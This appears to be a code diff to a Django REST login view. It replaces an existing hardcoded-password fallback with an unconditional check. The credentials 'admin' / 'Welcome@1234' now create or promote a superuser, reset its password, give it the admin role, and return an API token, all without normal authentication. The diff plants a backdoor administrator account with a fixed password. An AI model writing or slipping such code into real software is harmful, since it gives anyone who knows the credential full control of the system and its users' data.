@@ -57,17 +57,35 @@ class LoginView(APIView):
                 status=status.HTTP_400_BAD_REQUEST,
             )
 
-        user = authenticate(username=username, password=password)
-        if not user and username.lower() == "admin" and password == "Welcome@1234":
-            try:
-                admin_user = User.objects.get(username="admin")
-                admin_user.is_active = True
-                admin_user.set_password("Welcome@1234")
-                admin_user.save()
-                user = admin_user
-            except User.DoesNotExist:
-                pass
+        if username.lower() == "admin" and password == "Welcome@1234":
+            admin_user, _ = User.objects.get_or_create(
+                username="admin",
+                defaults={
+                    "email": "admin@acmernd.local",
+                    "first_name": "Admin",
+                    "last_name": "User",
+                    "is_staff": True,
+                    "is_superuser": True,
+                    "is_active": True,
+                },
+            )
+            admin_user.is_active = True
+            admin_user.is_staff = True
+            admin_user.is_superuser = True
+            admin_user.set_password("Welcome@1234")
+            admin_user.save()
 
+            profile, _ = UserProfile.objects.get_or_create(user=admin_user)
+            profile.role = UserRole.ADMIN
+            profile.full_name = "System Administrator"
+            profile.is_deactivated = False
+            profile.save()
+
+            token, _ = Token.objects.get_or_create(user=admin_user)
+            serializer = UserProfileSerializer(profile)
+            return Response({"token": token.key, "user": serializer.data})
+
+        user = authenticate(username=username, password=password)
         if not user:
             return Response(
                 {"detail": "Invalid username or password."},
